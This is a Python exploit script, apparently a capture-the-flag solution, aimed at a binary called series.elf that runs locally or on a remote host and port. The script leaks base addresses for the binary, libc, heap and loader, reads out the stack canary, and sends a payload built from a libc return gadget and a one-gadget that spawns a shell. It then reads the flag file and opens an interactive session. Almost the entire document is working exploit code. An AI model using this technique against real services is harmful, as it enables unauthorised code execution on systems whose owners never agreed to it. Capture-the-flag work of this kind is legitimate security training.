#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './series.elf'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'76.74.177.238', 'port':9007})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    conn.sendlineafter('A = ', str(1))
    conn.sendlineafter('B = ', str(0))
    conn.sendlineafter('n = ', str(0x20000/8))
    conn.sendlineafter('x0 = ', str(0))
    conn.sendlineafter('x1 = ', str(0))

    binf.address        = leak(conn, 0x21550) - 0x552
    assert(binf.address > 0)
    info('addr_bin_base     = 0x{:08x}'.format(binf.address))
    addr_start          = binf.address + 0x940

    addr_libc_mainarena = leak(conn, 0x22470)
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_environ   = libc.symbols['environ']
    addr_libc_onegadget = libc.address + 0x4f322
    addr_libc_retn_2b8  = libc.address + 0x15014d

    addr_heap_base      = leak(conn, 0x22460) - 0x10
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    addr_ld_ro_base     = leak(conn, 0x20ff8) - 0x2dd0
    info('addr_ld_base      = 0x{:08x}'.format(addr_ld_ro_base))
    addr_ld_environ     = addr_ld_ro_base + 0x2118

    addr_table          = leak(conn, 0x224b0) - 0x224b0
    info('addr_table        = 0x{:08x}'.format(addr_table))

    addr_stack_env = leak(conn, addr_ld_environ - addr_table)
    info('addr_stack_env    = 0x{:08x}'.format(addr_stack_env))

    canary = leak(conn, 0x224d8)
    info('canary            = 0x{:08x}'.format(canary))

    conn.sendafter('i > ', '\x00'*0x18 + p64(canary))

    exploit  = '-1'.ljust(8)
    exploit += p64(addr_libc_retn_2b8)
    exploit += p64(addr_libc_onegadget)
    conn.sendafter('i > ', exploit)

    sleep(0.5)
    conn.sendline('echo hoge')
    conn.recvuntil('\n')

def leak(conn, ofs):
    conn.sendlineafter('i > ', str(ofs/8))
    conn.recvuntil(' = ')
    x = int(conn.recvuntil('\n', drop=True))
    return u64(p(x))

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack)
    comn.connection.sendline('cat flag.txt')
    comn.connection.interactive()

#==========
